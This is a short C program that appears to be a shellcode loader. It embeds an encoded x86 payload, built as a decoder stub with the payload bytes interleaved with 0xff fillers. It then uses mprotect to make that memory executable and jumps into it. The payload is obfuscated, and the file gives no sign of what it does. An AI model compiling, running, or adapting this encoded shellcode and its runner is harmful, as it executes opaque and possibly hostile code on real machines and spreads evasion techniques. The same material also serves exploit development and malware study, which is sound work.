#include <sys/mman.h>
#include <stdio.h>
#include <string.h>

unsigned char code[] = "\x5b\x31\xc9\xb1\x01\x31\xc0\x3c\x92\x8a\x14\x0b\x88\x14\x03\x41\x41\x40\xff\xe3\xff\xdb\xff\xd8\xff\xba\xff\x83\xff\x39\xff\x67\xff\x22\xff\xd9\xff\x74\xff\x24\xff\xf4\xff\x58\xff\x29\xff\xc9\xff\xb1\xff\x13\xff\x83\xff\xe8\xff\xfc\xff\x31\xff\x50\xff\x14\xff\x03\xff\x50\xff\x97\xff\xdb\xff\x92\xff\xc9\xff\xa1\xff\xa3\xff\x58\xff\x0e\xff\xcd\xff\xd3\xff\x39\xff\x3f\xff\x04\xff\x1e\xff\x3d\xff\xb6\xff\x55\xff\x19\xff\x3d\xff\xc9\xff\x59\xff\x5a\xff\xcb\xff\x2e\xff\xd0\xff\xa3\xff\x71\xff\xb0\xff\xf2\xff\x53\xff\x86\xff\x7c\xff\x72\xff\xda\xff\x44\xff\xc6\xff\x76\xff\xdd\xff\x48\xff\x37\xff\xcd\xff\xdc\xff\x48\xff\x37\xff\x31\xff\x12\xff\xc8\xff\x8f\xff\x30\xff\xac\xff\xc9\xff\xef\xff\x89\xff\xac\xff\xc9\xff\xef\xff\xed\xff\x61\xff\x49\xff\x07\xff\x28\xff\x86\xff\xb5\xff\x27\xff\x9d\xff\x1c\xff\x3e\xff\xbb\xff\xce\xff\xae\xff\xdf\xff\x48\xff\x63\xff\x38\xff\x44\xff\xaf";


int main(){
  printf("Shellcode length: %d\n", strlen(code));
  int r =  mprotect((void *)((int)code & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())code;
  return ret();
}
